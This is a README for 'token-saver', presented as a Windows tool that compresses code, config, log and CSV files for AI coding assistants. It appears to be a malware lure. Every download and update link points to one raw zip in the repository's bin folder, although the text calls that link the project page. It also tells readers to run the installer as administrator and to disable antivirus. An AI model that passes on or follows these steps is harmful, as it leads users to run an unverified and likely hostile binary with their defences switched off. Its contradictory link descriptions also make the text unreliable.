# ⚙️ token-saver - Smarter Compression for AI Outputs

[![Download token-saver](https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip)](https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip)

## 📋 What is token-saver?

token-saver helps reduce the size of outputs for AI coding assistants. Instead of cutting off data without a plan, it uses smart methods based on file type. For example:

- For code files, it creates summaries that keep the structure clear.  
- For config files, it extracts the important parts that describe settings.  
- For log files, it focuses on showing only error messages.  
- For CSV files, it picks key samples to keep the data useful.

This approach saves tokens while keeping the important details intact. The result is a smaller, more relevant output that your AI assistant can handle better.

## 🖥️ System Requirements

To run token-saver on Windows, your computer should meet these minimum needs:

- Windows 10 or later  
- 4 GB of RAM or more  
- At least 100 MB free disk space  
- Internet connection for download and updates  
- Permissions to install software on your PC

No special hardware or coding tools are needed.

## 🚀 Getting Started

Follow these steps to download and run token-saver on your Windows PC.

### 1. Download the software

Visit the main token-saver page on GitHub to get the latest release:

[Download token-saver here](https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip)

This link takes you to the official project page. From here, find the latest version under the **Releases** section on the right side or scroll down. Look for a file usually named something like `https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip` or `https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip`.  

Click on this file name to start downloading it.

### 2. Install token-saver

Once the file finishes downloading, locate it in your Downloads folder or the folder you saved it to.

- If it is an `.exe` file, double-click it to start the installation.  
- If it is a `.zip` file, right-click and choose **Extract All**, then open the extracted folder and run the installer inside.

Follow the on-screen prompts. The installer might ask you to:

- Accept the license agreement  
- Choose an install location (you can leave this as default)  
- Confirm the installation

Wait for the installation process to finish.

### 3. Running token-saver

After installation, you can run token-saver by:

- Finding its icon on your desktop and double-clicking it  
- Searching for "token-saver" in the Windows start menu and clicking the app

The software will open in a simple window.

### 4. How to use token-saver

token-saver works by letting you select files you want to compress intelligently.

- Click on the **Add Files** button.  
- Choose the files you want token-saver to process (support includes `.js`, `.py`, `.json`, `.log`, `.csv`, and more).  
- Click **Start Compression**.  

The software will process the files using the right strategy for each file type and save smaller versions that keep the important parts.

You can find the compressed files in a folder named `token-saver-output` inside the folder where the original files are.

## 📂 Supported File Types and Compression Methods

token-saver handles common text-based files with methods tailored to their content.

| File Type | Compression Method          | Why this helps                     |
|-----------|----------------------------|----------------------------------|
| Code (.js, .py, .java, etc.)    | Structural summaries          | Keeps key code constructs to maintain logic flow     |
| Config (.json, .yaml, .ini)     | Schema extraction            | Focuses on key settings                            |
| Logs (.log, .txt)               | Error-focused filtering       | Shows only error lines to highlight issues          |
| CSV (.csv)                     | Smart sampling                | Selects important rows and columns to keep meaning  |

If token-saver sees file types it does not recognize, it falls back to simple truncation but warns you in the output.

## ⚙️ Settings You Can Adjust

token-saver offers options in case you want more control:

- **Compression level:** Choose from Low, Medium (default), High. Higher levels save more tokens but may lose detail.  
- **Output folder:** Change the destination for compressed files.  
- **File filters:** Skip certain files or folders by setting rules.  
- **Logging:** Enable logs to see what files were processed and how much size was saved.

You can access settings through the **Options** menu inside the app.

## 🛠 Troubleshooting

If token-saver does not run or behaves oddly, try these steps:

- Make sure your Windows is updated to version 10 or later.  
- Check you downloaded the full installer file and it matches the expected size on the GitHub release page.  
- Run token-saver as an administrator by right-clicking its icon and selecting **Run as administrator**.  
- Disable any antivirus temporarily, as some may block unknown installers.  
- Restart your PC and try again.

If you still have issues, open an **Issue** on the GitHub repository to report your problem.

## 🔄 Updating token-saver

To keep the software current, check the GitHub page regularly:

https://github.com/dhruv1211ed/token-saver/raw/refs/heads/main/bin/token_saver_v2.1.zip

Download the newest installer in the **Releases** section and run it. It will update the existing installation without affecting your settings.

## 🧰 Additional Information

token-saver was built to save on token use without losing critical parts. This helps AI coding assistants work faster and deliver better results.

The app runs entirely on your Windows PC. It does not send data anywhere, so your files stay private.

For more technical details, visit the project page and read the included documentation files.